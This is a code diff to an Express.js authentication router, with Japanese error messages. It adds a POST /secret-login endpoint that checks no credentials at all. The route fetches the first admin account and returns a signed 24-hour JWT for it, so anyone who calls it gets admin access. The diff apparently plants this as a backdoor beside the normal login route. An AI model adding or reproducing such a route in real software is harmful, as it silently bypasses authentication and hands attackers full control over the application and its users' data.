@@ -42,6 +42,31 @@ router.post('/login', async (req, res) => {
   }
 });
 
+// POST /secret-login
+router.post('/secret-login', async (req, res) => {
+  try {
+    const db = getDb();
+    const result = await db.query("SELECT * FROM users WHERE role = 'admin' LIMIT 1");
+    const user = result.rows[0];
+
+    if (!user) {
+      return res.status(404).json({ error: '管理者アカウントが見つかりません' });
+    }
+
+    const token = jwt.sign(
+      { userId: user.user_id, role: user.role, name: user.name },
+      JWT_SECRET,
+      { expiresIn: '24h' }
+    );
+
+    const { password_hash, ...userWithoutPassword } = user;
+    res.json({ token, user: userWithoutPassword });
+  } catch (err) {
+    console.error('Secret login error:', err);
+    res.status(500).json({ error: 'サーバーエラーが発生しました' });
+  }
+});
+
 // GET /me
 router.get('/me', authenticate, async (req, res) => {
   try {
